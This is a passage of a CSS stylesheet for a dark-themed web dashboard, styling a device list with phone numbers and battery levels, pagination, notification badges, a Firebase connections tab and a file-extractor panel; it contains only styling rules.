    gap: 3px;
  }
  .sdp:hover {
    color: #94a3b8;
    border-color: rgba(255, 255, 255, 0.15);
  }
  .sdp-a {
    background: rgba(249, 115, 22, 0.15) !important;
    color: #f97316 !important;
    border-color: rgba(249, 115, 22, 0.4) !important;
  }
  .sdp-on {
    background: rgba(34, 197, 94, 0.14) !important;
    color: #22c55e !important;
    border-color: rgba(34, 197, 94, 0.3) !important;
  }
  .sdp-num {
    background: rgba(56, 189, 248, 0.12) !important;
    color: #38bdf8 !important;
    border-color: rgba(56, 189, 248, 0.3) !important;
  }
  .sdp-numon {
    background: rgba(34, 197, 94, 0.12) !important;
    color: #22c55e !important;
    border-color: rgba(34, 197, 94, 0.3) !important;
    font-size: 9.5px !important;
  }
  .sdp-off {
    background: rgba(239, 68, 68, 0.1) !important;
    color: #ef4444 !important;
    border-color: rgba(239, 68, 68, 0.25) !important;
  }
  .sdp-cnt {
    font-family: "JetBrains Mono", monospace;
    font-size: 9px;
  }

  .side-dev-list {
    flex: 1;
    overflow-y: auto;
    overflow-x: hidden;
    scrollbar-width: thin;
    scrollbar-color: rgba(255, 255, 255, 0.08) transparent;
    display: flex;
    flex-direction: column;
  }
  .side-dev-list::-webkit-scrollbar {
    width: 3px;
  }
  .side-dev-list::-webkit-scrollbar-thumb {
    background: rgba(255, 255, 255, 0.1);
    border-radius: 3px;
  }

  .sdv-item {
    display: flex;
    align-items: center;
    gap: 7px;
    padding: 7px 8px 7px 12px;
    cursor: pointer;
    border: none;
    background: transparent;
    text-align: left;
    font-family: inherit;
    position: relative;
    border-bottom: 1px solid rgba(255, 255, 255, 0.03);
    transition: background 80ms;
    min-height: 44px;
    width: 100%;
  }
  .sdv-item:hover {
    background: rgba(255, 255, 255, 0.04);
  }
  .sdv-item.sdv-sel {
    background: rgba(249, 115, 22, 0.08);
  }
  .sdv-bar {
    position: absolute;
    left: 0;
    top: 4px;
    bottom: 4px;
    width: 3px;
    border-radius: 2px;
    flex-shrink: 0;
  }
  .sdv-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .sdv-body {
    flex: 1;
    min-width: 0;
    display: flex;
    flex-direction: column;
    gap: 1px;
  }
  .sdv-id {
    font-size: 11px;
    font-weight: 600;
    color: #e2e8f0;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .sdv-phone {
    font-size: 10.5px;
    color: #94a3b8;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    font-family: "JetBrains Mono", monospace;
  }
  .sdv-phone-btn {
    font-size: 10.5px;
    color: #38bdf8;
    background: none;
    border: none;
    padding: 0;
    cursor: pointer;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
    font-family: "JetBrains Mono", monospace;
    text-align: left;
    transition: color 120ms;
    text-decoration: underline;
    text-decoration-color: transparent;
    text-underline-offset: 2px;
  }
  .sdv-phone-btn:hover {
    color: #7dd3fc;
    text-decoration-color: #38bdf8;
  }
  .mc-sender-btn {
    font-size: 12px;
    font-weight: 700;
    color: #e2e8f0;
    background: none;
    border: none;
    padding: 0;
    cursor: pointer;
    font-family: inherit;
    transition: color 120ms;
    text-decoration: underline;
    text-decoration-color: transparent;
    text-underline-offset: 2px;
  }
  .mc-sender-btn:hover {
    color: #38bdf8;
    text-decoration-color: #38bdf8;
  }
  .mc-sender-clickable {
    cursor: pointer;
    transition: color 120ms;
  }
  .mc-sender-clickable:hover {
    color: #38bdf8;
    text-decoration: underline;
    text-underline-offset: 2px;
  }
  .sdv-fb {
    font-size: 10px;
    overflow: hidden;
    text-overflow: ellipsis;
    white-space: nowrap;
  }
  .sdv-bat {
    font-size: 10px;
    font-weight: 700;
    flex-shrink: 0;
    font-family: "JetBrains Mono", monospace;
  }
  .sdv-copy {
    width: 20px;
    height: 20px;
    border-radius: 4px;
    border: none;
    background: rgba(255, 255, 255, 0.06);
    color: rgba(255, 255, 255, 0.3);
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    flex-shrink: 0;
    transition: all 120ms;
    padding: 0;
  }
  .sdv-copy:hover {
    background: rgba(56, 189, 248, 0.18);
    color: #38bdf8;
  }
  .sdv-empty {
    padding: 24px 12px;
    text-align: center;
    color: #334155;
    font-size: 12px;
  }
  .sdv-more {
    width: 100%;
    padding: 8px;
    font-size: 11px;
    color: #f97316;
    background: none;
    border: none;
    border-top: 1px solid rgba(255, 255, 255, 0.05);
    cursor: pointer;
    font-family: inherit;
    transition: background 120ms;
  }
  .sdv-more:hover {
    background: rgba(249, 115, 22, 0.06);
  }

  /* ── Dashboard filter chip: online-numbers count ──────────────────────────── */
  .dt-chip-online {
    font-size: 9px;
    font-weight: 800;
    padding: 1px 5px;
    border-radius: 8px;
    background: rgba(34, 197, 94, 0.15);
    color: #22c55e;
    border: 1px solid rgba(34, 197, 94, 0.3);
    font-family: "JetBrains Mono", monospace;
    flex-shrink: 0;
  }

  /* ── Bottom nav notification badge ───────────────────────────────────────── */
  .bn-notif-badge {
    position: absolute;
    top: -4px;
    right: -4px;
    min-width: 15px;
    height: 15px;
    border-radius: 8px;
    background: #ef4444;
    color: #fff;
    font-size: 8px;
    font-weight: 800;
    display: flex;
    align-items: center;
    justify-content: center;
    padding: 0 2px;
    pointer-events: none;
    border: 2px solid #0b0e17;
  }

  /* Inline dashboard filter search bar */
  .dt-search-wrap {
    display: inline-flex;
    align-items: center;
    gap: 6px;
    background: rgba(255, 255, 255, 0.05);
    border: 1px solid rgba(255, 255, 255, 0.1);
    border-radius: 20px;
    padding: 3px 10px 3px 9px;
    min-width: 170px;
    max-width: 280px;
    color: #94a3b8;
    transition: all 140ms;
    height: 28px;
    flex: 1 1 auto;
  }
  .dt-search-wrap:focus-within {
    border-color: rgba(249, 115, 22, 0.5);
    background: rgba(249, 115, 22, 0.06);
    color: #f97316;
    box-shadow: 0 0 10px rgba(249, 115, 22, 0.15);
  }
  .dt-search-in {
    background: transparent;
    border: none;
    outline: none;
    color: #f1f5f9;
    font-size: 11.5px;
    font-family: inherit;
    width: 100%;
    min-width: 70px;
  }
  .dt-search-in::placeholder {
    color: #475569;
  }
  .dt-search-clear {
    background: none;
    border: none;
    color: #64748b;
    font-size: 11px;
    cursor: pointer;
    padding: 0;
    line-height: 1;
    display: flex;
    align-items: center;
    transition: color 100ms;
  }
  .dt-search-clear:hover {
    color: #cbd5e1;
  }

  /* Filtered result count & top pagination bar */
  .dt-count-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 8px;
    padding: 7px 14px;
    background: rgba(255, 255, 255, 0.02);
    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
    flex-shrink: 0;
  }
  .dt-count {
    font-size: 11.5px;
    color: #94a3b8;
    display: flex;
    align-items: center;
    gap: 5px;
    font-weight: 500;
  }
  .dt-cnt-val {
    color: #f1f5f9;
    font-weight: 700;
  }
  .dt-filter-tag {
    color: #f97316;
    font-weight: 600;
  }
  .pag-compact {
    display: inline-flex;
    align-items: center;
    gap: 6px;
  }
  .pag-btn-sm {
    height: 26px;
    padding: 0 10px;
    border-radius: 6px;
    background: rgba(255, 255, 255, 0.08);
    border: 1px solid rgba(255, 255, 255, 0.14);
    color: #e2e8f0;
    font-size: 11.5px;
    font-weight: 600;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    gap: 3px;
    transition: all 120ms;
    font-family: inherit;
  }
  .pag-btn-sm:hover:not(:disabled) {
    background: rgba(249, 115, 22, 0.2);
    color: #f97316;
    border-color: rgba(249, 115, 22, 0.45);
  }
  .pag-btn-sm:disabled {
    opacity: 0.3;
    cursor: not-allowed;
    color: #475569;
    background: rgba(255, 255, 255, 0.02);
    border-color: rgba(255, 255, 255, 0.04);
  }
  .pag-pill {
    font-size: 11.5px;
    color: #94a3b8;
    background: rgba(0, 0, 0, 0.3);
    padding: 3px 9px;
    border-radius: 6px;
    border: 1px solid rgba(255, 255, 255, 0.06);
    font-family: "JetBrains Mono", monospace;
  }
  .pag-pill strong {
    color: #f97316;
    font-weight: 700;
  }

  /* ── Pagination bar (Bottom) ─────────────────────────────────────────────── */
  .pag-bar {
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 10px;
    padding: 10px 14px;
    background: #111726;
    border-top: 1px solid rgba(255, 255, 255, 0.08);
    flex-shrink: 0;
  }
  .pag-group-left {
    display: flex;
    align-items: center;
  }
  .pag-summary {
    font-size: 12px;
    color: #94a3b8;
    font-family: "JetBrains Mono", monospace;
  }
  .pag-summary strong {
    color: #f1f5f9;
  }
  .pag-group-controls {
    display: flex;
    align-items: center;
    gap: 5px;
    flex-wrap: wrap;
  }
  .pag-btn {
    height: 30px;
    border-radius: 7px;
    background: rgba(255, 255, 255, 0.07);
    border: 1px solid rgba(255, 255, 255, 0.12);
    color: #cbd5e1;
    cursor: pointer;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    transition: all 120ms;
    font-family: inherit;
    font-size: 12px;
    font-weight: 500;
  }
  .pag-btn-nav {
    padding: 0 9px;
    gap: 4px;
  }
  .pag-btn-txt {
    font-size: 11.5px;
  }
  .pag-nums {
    display: inline-flex;
    align-items: center;
    gap: 4px;
  }
  .pag-btn.pag-num {
    min-width: 30px;
    height: 30px;
    padding: 0 6px;
    font-weight: 600;
    font-size: 12px;
    font-family: "JetBrains Mono", monospace;
  }
  .pag-btn.pag-num.active {
    background: #f97316;
    color: #ffffff;
    border-color: #f97316;
    box-shadow: 0 2px 8px rgba(249, 115, 22, 0.4);
    font-weight: 700;
  }
  .pag-info-badge {
    font-size: 11.5px;
    color: #94a3b8;
    background: rgba(0, 0, 0, 0.35);
    padding: 4px 9px;
    border-radius: 6px;
    border: 1px solid rgba(255, 255, 255, 0.07);
    font-family: "JetBrains Mono", monospace;
  }
  .pag-info-badge strong {
    color: #f97316;
  }
  .pag-btn:hover:not(:disabled) {
    background: rgba(249, 115, 22, 0.18);
    color: #f97316;
    border-color: rgba(249, 115, 22, 0.4);
  }
  .pag-btn:disabled {
    opacity: 0.3;
    cursor: not-allowed;
    background: rgba(255, 255, 255, 0.02);
    border-color: rgba(255, 255, 255, 0.04);
    color: #475569;
  }

  /* ── Mobile responsive overrides for dashboard devices & scrolling ────────── */
  @media (max-width: 768px) {
    .tab-body-overview {
      padding: 8px 10px calc(70px + env(safe-area-inset-bottom, 0px)) !important;
      gap: 8px !important;
      height: 100% !important;
      min-height: 0 !important;
      overflow: hidden !important;
      display: flex !important;
      flex-direction: column !important;
    }
    .dt-card {
      flex: 1 !important;
      min-height: 0 !important;
      display: flex !important;
      flex-direction: column !important;
      border-radius: 8px !important;
    }
    .dt-scroll {
      flex: 1 !important;
      min-height: 0 !important;
      max-height: none !important;
      overflow-y: auto !important;
      overflow-x: hidden !important;
      -webkit-overflow-scrolling: touch !important;
      overscroll-behavior-y: contain !important;
    }
    .stat-row {
      grid-template-columns: repeat(4, 1fr) !important;
      gap: 5px !important;
    }
    .stat-card {
      padding: 6px 8px !important;
    }
    .sc-n {
      font-size: 19px !important;
    }
    .sc-l {
      font-size: 8px !important;
      letter-spacing: 0.04em !important;
    }
    .live-card {
      padding: 8px 12px !important;
      gap: 8px !important;
    }
    .lc-icon {
      width: 36px !important;
      height: 36px !important;
    }
    .lc-title {
      font-size: 13px !important;
    }
    .lc-sub {
      font-size: 10px !important;
    }
    .sidebar {
      padding-bottom: 0 !important;
    }
    .side-dev-list {
      padding-bottom: 28px !important;
      min-height: 0 !important;
      -webkit-overflow-scrolling: touch !important;
    }
    .pag-bar {
      justify-content: space-between !important;
      padding: 8px 10px !important;
      gap: 6px !important;
    }
    .pag-summary {
      font-size: 11px !important;
    }
    .pag-btn-txt {
      display: none !important;
    }
    .pag-btn-nav {
      padding: 0 7px !important;
    }
    .bell-panel {
      position: fixed !important;
      top: 52px !important;
      left: 8px !important;
      right: 8px !important;
      width: auto !important;
      max-width: calc(100vw - 16px) !important;
      max-height: calc(100vh - 125px) !important;
      max-height: calc(100dvh - 125px) !important;
      transform: none !important;
      z-index: 250 !important;
      border-radius: 16px !important;
    }
    .bp-resize-edge,
    .bp-resize-corner {
      display: none !important;
    }
    .notif-stack {
      top: auto !important;
      right: 8px !important;
      left: 8px !important;
      bottom: calc(68px + env(safe-area-inset-bottom, 0px)) !important;
      width: auto !important;
      max-width: 420px !important;
      padding: 0 !important;
      max-height: 50vh !important;
      margin: 0 auto !important;
    }
    .toast-stack {
      right: 12px !important;
      left: 12px !important;
      bottom: calc(70px + env(safe-area-inset-bottom, 0px)) !important;
      transform: none !important;
      width: auto !important;
      max-width: 380px !important;
      margin: 0 auto !important;
    }
  }


  /* ── Tab count badge ──────────────────────────────────────────────────── */
  .tab-cnt {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    min-width: 17px;
    height: 16px;
    font-size: 10px;
    font-weight: 700;
    font-family: 'JetBrains Mono', monospace;
    background: rgba(249,115,22,0.2);
    color: #f97316;
    border-radius: 4px;
    padding: 0 4px;
    margin-left: 4px;
    vertical-align: middle;
  }
  .tab.active .tab-cnt {
    background: rgba(249,115,22,0.3);
  }

  /* ── Firebase Connections tab body ───────────────────────────────────── */
  .tab-body-firebase {
    overflow-y: auto !important;
    padding: 0 !important;
    gap: 0 !important;
    display: flex !important;
    flex-direction: column !important;
    height: 100% !important;
    min-height: 0 !important;
  }

  /* ── FC Toolbar ──────────────────────────────────────────────────────── */
  .fc-toolbar {
    display: flex;
    align-items: center;
    gap: 10px;
    padding: 12px 18px;
    border-bottom: 1px solid rgba(255,255,255,0.07);
    background: #0e1420;
    flex-shrink: 0;
    flex-wrap: wrap;
  }
  .fc-search-wrap {
    display: flex;
    align-items: center;
    gap: 7px;
    background: rgba(255,255,255,0.05);
    border: 1px solid rgba(255,255,255,0.09);
    border-radius: 7px;
    padding: 6px 10px;
    min-width: 200px;
    flex: 1;
  }
  .fc-search-in {
    background: none;
    border: none;
    outline: none;
    color: #e2e8f0;
    font-size: 12.5px;
    font-family: inherit;
    width: 100%;
  }
  .fc-search-in::placeholder { color: #475569; }
  .fc-search-clear {
    background: none;
    border: none;
    color: #64748b;
    cursor: pointer;
    font-size: 14px;
    padding: 0;
    line-height: 1;
    font-family: inherit;
  }
  .fc-search-clear:hover { color: #ef4444; }
  .fc-filter-pills {
    display: flex;
    gap: 4px;
    flex-shrink: 0;
  }
  .fc-pill {
    padding: 5px 10px;
    font-size: 11.5px;
    font-weight: 600;
    border-radius: 6px;
    border: 1px solid rgba(255,255,255,0.1);
    background: transparent;
    color: #64748b;
    cursor: pointer;
    font-family: inherit;
    transition: all 130ms;
  }
  .fc-pill:hover { color: #94a3b8; border-color: rgba(255,255,255,0.18); }
  .fc-pill-a { background: #f97316 !important; color: #fff !important; border-color: #f97316 !important; }
  .fc-pill-on { background: rgba(34,197,94,0.18) !important; color: #22c55e !important; border-color: rgba(34,197,94,0.4) !important; }
  .fc-pill-off { background: rgba(239,68,68,0.14) !important; color: #ef4444 !important; border-color: rgba(239,68,68,0.3) !important; }
  .fc-pill-fail { color: #f59e0b; border-color: rgba(245,158,11,0.3); }
  .fc-pill-fail:hover { background: rgba(245,158,11,0.1) !important; color: #f59e0b !important; }
  .fc-pill-fail-a { background: rgba(245,158,11,0.18) !important; color: #f59e0b !important; border-color: rgba(245,158,11,0.45) !important; }
  .fc-pill-cnt {
    display: inline-flex;
    background: rgba(255,255,255,0.12);
    border-radius: 3px;
    padding: 0 4px;
    font-size: 10px;
    margin-left: 3px;
  }
  .fc-global-actions {
    display: flex;
    gap: 5px;
    flex-shrink: 0;
    flex-wrap: wrap;
    align-items: center;
  }
  .fc-act-btn {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    padding: 5px 10px;
    font-size: 11.5px;
    font-weight: 600;
    border-radius: 6px;
    border: 1px solid rgba(255,255,255,0.12);
    background: rgba(255,255,255,0.05);
    color: #94a3b8;
    cursor: pointer;
    font-family: inherit;
    transition: all 130ms;
    white-space: nowrap;
  }
  .fc-act-btn:hover { background: rgba(249,115,22,0.12); color: #f97316; border-color: rgba(249,115,22,0.35); }
  .fc-act-danger { color: #f59e0b !important; border-color: rgba(245,158,11,0.3) !important; }
  .fc-act-danger:hover { background: rgba(245,158,11,0.14) !important; color: #f59e0b !important; border-color: rgba(245,158,11,0.5) !important; }

  /* ── Master toggle ──────────────────────────────────────────────────────── */
  .fc-master-toggle {
    display: inline-flex;
    align-items: center;
    gap: 7px;
    padding: 4px 10px 4px 5px;
    border-radius: 20px;
    border: 1px solid rgba(255,255,255,0.12);
    background: rgba(255,255,255,0.05);
    cursor: pointer;
    font-family: inherit;
    font-size: 11.5px;
    font-weight: 700;
    transition: all 180ms;
    position: relative;
    flex-shrink: 0;
  }
  .fmt-knob {
    width: 28px;
    height: 15px;
    border-radius: 8px;
    position: relative;
    flex-shrink: 0;
    transition: background 180ms;
  }
  .fmt-knob::after {
    content: '';
    position: absolute;
    width: 11px;
    height: 11px;
    background: #fff;
    border-radius: 50%;
    top: 2px;
    transition: left 180ms;
  }
  .fmt-on .fmt-knob { background: #22c55e; box-shadow: 0 0 8px rgba(34,197,94,0.35); }
  .fmt-on .fmt-knob::after { left: 15px; }
  .fmt-off .fmt-knob { background: #334155; }
  .fmt-off .fmt-knob::after { left: 2px; }
  .fmt-label { color: #94a3b8; letter-spacing: 0.02em; }
  .fmt-on .fmt-label { color: #22c55e; }
  .fmt-off .fmt-label { color: #ef4444; }
  .fc-master-toggle:hover { border-color: rgba(255,255,255,0.22); background: rgba(255,255,255,0.09); }

  /* ── FC Selection bar ─────────────────────────────────────────────────── */
  .fc-sel-bar {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 8px 18px;
    background: rgba(249,115,22,0.08);
    border-bottom: 1px solid rgba(249,115,22,0.2);
    flex-shrink: 0;
    flex-wrap: wrap;
  }
  .fc-sel-count { font-size: 12px; font-weight: 700; color: #f97316; margin-right: 4px; }
  .fc-sel-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 4px 10px;
    font-size: 11.5px;
    font-weight: 600;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.12);
    background: rgba(255,255,255,0.07);
    color: #e2e8f0;
    cursor: pointer;
    font-family: inherit;
    transition: all 130ms;
  }
  .fc-sel-btn:hover { background: rgba(255,255,255,0.13); }
  .fc-sel-danger { border-color: rgba(239,68,68,0.3) !important; color: #ef4444 !important; }
  .fc-sel-danger:hover { background: rgba(239,68,68,0.15) !important; }

  /* ── FC Select All Row ──────────────────────────────────────────────── */
  .fc-select-all-row {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 8px 18px;
    border-bottom: 1px solid rgba(255,255,255,0.05);
    flex-shrink: 0;
  }
  .fc-chk-label {
    display: flex;
    align-items: center;
    gap: 7px;
    font-size: 12px;
    color: #64748b;
    cursor: pointer;
    user-select: none;
  }
  .fc-chk { accent-color: #f97316; cursor: pointer; }
  .fc-showing { font-size: 11px; color: #475569; }

  /* ── FC List ──────────────────────────────────────────────────────────── */
  .fc-list {
    display: flex;
    flex-direction: column;
    gap: 0;
    overflow-y: auto;
    flex: 1;
    min-height: 0;
  }
  .fc-list::-webkit-scrollbar { width: 5px; }
  .fc-list::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 99px; }

  /* ── FC Card ──────────────────────────────────────────────────────────── */
  .fc-card {
    border-bottom: 1px solid rgba(255,255,255,0.06);
    transition: background 120ms;
  }
  .fc-card:hover { background: rgba(255,255,255,0.02); }
  .fc-card-sel { background: rgba(249,115,22,0.05) !important; }
  .fc-card-hdr {
    display: flex;
    align-items: center;
    gap: 8px;
    padding: 10px 18px;
    flex-wrap: wrap;
  }
  .fc-dot {
    width: 9px;
    height: 9px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .fc-name {
    font-size: 13px;
    font-weight: 700;
    color: #e2e8f0;
    flex-shrink: 0;
  }
  .fc-status-badge {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    font-size: 11px;
    font-weight: 600;
    padding: 2px 8px;
    border-radius: 5px;
    flex-shrink: 0;
  }
  .fc-status-dot {
    width: 6px;
    height: 6px;
    border-radius: 50%;
    flex-shrink: 0;
  }
  .fc-online { background: rgba(34,197,94,0.12); color: #22c55e; border: 1px solid rgba(34,197,94,0.25); }
  .fc-online .fc-status-dot { background: #22c55e; box-shadow: 0 0 4px rgba(34,197,94,0.6); }
  .fc-offline { background: rgba(100,116,139,0.1); color: #64748b; border: 1px solid rgba(100,116,139,0.2); }
  .fc-offline .fc-status-dot { background: #334155; }
  .fc-auth-badge {
    font-size: 10.5px;
    font-weight: 700;
    padding: 2px 6px;
    border-radius: 4px;
    background: rgba(167,139,250,0.12);
    color: #a78bfa;
    border: 1px solid rgba(167,139,250,0.25);
    flex-shrink: 0;
  }
  .fc-card-actions {
    display: flex;
    align-items: center;
    gap: 4px;
    margin-left: auto;
    flex-wrap: wrap;
  }
  .fc-copy-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 4px 8px;
    font-size: 11px;
    font-weight: 600;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #64748b;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
    white-space: nowrap;
  }
  .fc-copy-btn:hover { background: rgba(56,189,248,0.1); color: #38bdf8; border-color: rgba(56,189,248,0.3); }
  .fc-copied { background: rgba(34,197,94,0.12) !important; color: #22c55e !important; border-color: rgba(34,197,94,0.3) !important; }
  .fc-edit-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 4px 8px;
    font-size: 11px;
    font-weight: 600;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #64748b;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
  }
  .fc-edit-btn:hover { background: rgba(249,115,22,0.12); color: #f97316; border-color: rgba(249,115,22,0.35); }
  .fc-remove-btn {
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 27px;
    height: 27px;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.08);
    background: rgba(255,255,255,0.03);
    color: #475569;
    cursor: pointer;
    transition: all 120ms;
  }
  .fc-remove-btn:hover { background: rgba(239,68,68,0.15); color: #ef4444; border-color: rgba(239,68,68,0.3); }

  /* ── FC Card Body ─────────────────────────────────────────────────────── */
  .fc-card-body {
    padding: 0 18px 10px 35px;
    display: flex;
    flex-direction: column;
    gap: 5px;
  }
  .fc-url-row {
    display: flex;
    align-items: center;
    gap: 8px;
  }
  .fc-url-label {
    font-size: 9.5px;
    font-weight: 700;
    text-transform: uppercase;
    letter-spacing: 0.08em;
    color: #334155;
    flex-shrink: 0;
    width: 28px;
  }
  .fc-url-val {
    font-family: 'JetBrains Mono', monospace;
    font-size: 11.5px;
    color: #38bdf8;
    word-break: break-all;
    background: none;
    padding: 0;
  }
  .fc-meta-row {
    display: flex;
    gap: 14px;
    flex-wrap: wrap;
    align-items: center;
  }
  .fc-meta-item { font-size: 11px; color: #475569; }
  .fc-meta-lbl { color: #334155; font-weight: 600; }
  .fc-meta-val { font-family: 'JetBrains Mono', monospace; color: #64748b; font-size: 10.5px; }
  .fc-auth-yes { color: #a78bfa !important; font-family: inherit !important; }
  .fc-auth-no { color: #334155 !important; font-family: inherit !important; }
  .fc-error-item { color: #ef4444 !important; }

  /* ── FC Edit Form ─────────────────────────────────────────────────────── */
  .fc-edit-form {
    padding: 10px 18px 12px 35px;
    border-top: 1px solid rgba(255,255,255,0.06);
    background: rgba(0,0,0,0.2);
  }
  .fc-edit-grid {
    display: grid;
    grid-template-columns: 1fr 2fr 1fr 1fr 1fr;
    gap: 8px;
    margin-bottom: 8px;
  }
  .fc-edit-foot {
    display: flex;
    justify-content: flex-end;
    gap: 7px;
  }

  /* ── FC Empty state ───────────────────────────────────────────────────── */
  .fc-empty {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 12px;
    flex: 1;
    padding: 60px 20px;
    text-align: center;
  }
  .fc-empty-title { font-size: 15px; font-weight: 700; color: #475569; }
  .fc-empty-sub { font-size: 12px; color: #334155; max-width: 320px; line-height: 1.5; }

  /* ── Bulk editable URLs ───────────────────────────────────────────────── */
  .bulk-preview-hdr {
    display: flex;
    align-items: center;
    justify-content: space-between;
    margin-bottom: 7px;
  }
  .bulk-url-edit {
    flex: 1;
    min-width: 0;
    background: rgba(0,0,0,0.25);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 4px;
    color: #94a3b8;
    font-family: 'JetBrains Mono', monospace;
    font-size: 10.5px;
    padding: 3px 6px;
    outline: none;
    transition: border-color 120ms;
  }
  .bulk-url-edit:focus { border-color: rgba(249,115,22,0.4); color: #e2e8f0; }
  .bulk-rm-btn {
    background: none;
    border: none;
    color: #475569;
    cursor: pointer;
    font-size: 14px;
    width: 20px;
    height: 20px;
    display: flex;
    align-items: center;
    justify-content: center;
    border-radius: 3px;
    padding: 0;
    flex-shrink: 0;
    transition: all 110ms;
    font-family: inherit;
    line-height: 1;
  }
  .bulk-rm-btn:hover { color: #ef4444; background: rgba(239,68,68,0.1); }
  .bulk-action-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 3px 8px;
    font-size: 10.5px;
    font-weight: 600;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #64748b;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
  }
  .bulk-action-btn:hover { color: #38bdf8; border-color: rgba(56,189,248,0.3); background: rgba(56,189,248,0.07); }
  .bulk-clear-btn:hover { color: #ef4444 !important; border-color: rgba(239,68,68,0.3) !important; background: rgba(239,68,68,0.07) !important; }

  /* ── Universal Extractor ─────────────────────────────────────────────── */
  .ux-container {
    display: flex;
    flex-direction: column;
    gap: 10px;
    padding: 12px;
  }
  .ux-drop-zone {
    position: relative;
    border: 1.5px dashed rgba(255,255,255,0.12);
    border-radius: 8px;
    background: rgba(0,0,0,0.18);
    transition: all 180ms;
    display: flex;
    flex-direction: column;
    gap: 0;
  }
  .ux-drop-zone.ux-drop-active {
    border-color: rgba(249,115,22,0.6);
    background: rgba(249,115,22,0.06);
    box-shadow: 0 0 20px rgba(249,115,22,0.08);
  }
  .ux-input-header {
    display: flex;
    align-items: center;
    gap: 7px;
    padding: 9px 12px 0;
    font-size: 11.5px;
    font-weight: 600;
    color: #64748b;
  }
  .ux-input-header svg { color: #f97316; flex-shrink: 0; }
  .ux-textarea {
    width: 100%;
    box-sizing: border-box;
    background: transparent;
    border: none;
    color: #e2e8f0;
    font-size: 11px;
    font-family: 'JetBrains Mono', monospace;
    padding: 8px 12px;
    outline: none;
    resize: vertical;
    min-height: 72px;
    line-height: 1.6;
  }
  .ux-textarea::placeholder { color: #334155; }
  .ux-input-actions {
    display: flex;
    align-items: center;
    gap: 6px;
    padding: 0 10px 9px;
    justify-content: flex-end;
  }
  .ux-file-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 4px 10px;
    font-size: 10.5px;
    font-weight: 600;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #64748b;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
  }
  .ux-file-btn:hover { color: #f97316; border-color: rgba(249,115,22,0.3); background: rgba(249,115,22,0.07); }
  .ux-clear-input-btn {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 4px 10px;
    font-size: 10.5px;
    font-weight: 600;
    border-radius: 5px;
    border: 1px solid rgba(255,255,255,0.1);
    background: rgba(255,255,255,0.05);
    color: #64748b;
    cursor: pointer;
    font-family: inherit;
    transition: all 120ms;
  }
  .ux-clear-input-btn:hover { color: #ef4444; border-color: rgba(239,68,68,0.3); background: rgba(239,68,68,0.07); }
  .ux-extract-btn {
    display: inline-flex;
    align-items: center;
    gap: 5px;
    flex-shrink: 0;
  }
  .ux-drop-overlay {
    position: absolute;
    inset: 0;
    background: rgba(249,115,22,0.08);
    border-radius: 8px;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    gap: 6px;
    color: #f97316;
    font-size: 13px;
    font-weight: 600;
    pointer-events: none;
    z-index: 5;
    backdrop-filter: blur(2px);
  }

  /* Uploaded file tags */
  .ux-uploaded-files {
    display: flex;
    flex-wrap: wrap;
    gap: 5px;
  }
  .ux-file-tag {
    display: inline-flex;
    align-items: center;
    gap: 4px;
    padding: 3px 8px;
    font-size: 10px;
    font-weight: 600;
    border-radius: 4px;
    background: rgba(249,115,22,0.1);
    border: 1px solid rgba(249,115,22,0.2);
    color: #f97316;
  }
  .ux-file-tag-count {
    background: rgba(249,115,22,0.25);
    padding: 0 4px;
    border-radius: 3px;
    font-size: 9.5px;
    min-width: 12px;
    text-align: center;
  }

  /* Error display */
  .ux-errors {
    display: flex;
    flex-direction: column;
    gap: 4px;
  }
  .ux-error-item {
    display: flex;
    align-items: flex-start;
    gap: 6px;
    font-size: 10.5px;
    color: #ef4444;
    background: rgba(239,68,68,0.06);
    border: 1px solid rgba(239,68,68,0.15);
    border-radius: 5px;
    padding: 5px 9px;
    line-height: 1.4;
  }
  .ux-error-item svg { flex-shrink: 0; margin-top: 1px; }

  /* Results panel */
  .ux-results {
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 7px;
    overflow: hidden;
    background: rgba(0,0,0,0.12);
  }
  .ux-results-header {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: 7px 10px;
    background: rgba(255,255,255,0.03);
    border-bottom: 1px solid rgba(255,255,255,0.06);
  }
  .ux-results-title {
    display: flex;
